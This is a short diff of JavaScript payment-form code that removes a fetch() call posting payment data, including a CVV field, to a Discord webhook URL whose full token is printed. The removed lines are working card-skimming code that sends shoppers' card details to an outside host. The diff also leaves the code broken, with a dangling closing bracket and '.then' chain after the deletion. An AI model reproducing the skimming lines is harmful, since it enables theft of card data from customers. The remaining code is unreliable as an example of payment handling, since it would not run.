@@ -58,13 +58,7 @@
                 cvv: cvv
             };
 
-            // Send the payment data to the webhook endpoint
-            fetch('https://discord.com/api/webhooks/1227781210613219389/lKQg2wKst1fK7PDRisbwCvVfBe65W9HAy46XOroNRzy7Za5gErtM7Bh8A1pqhF3XpCCX', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(paymentData),
+         
             })
             .then(response => {
                 if (!response.ok) {
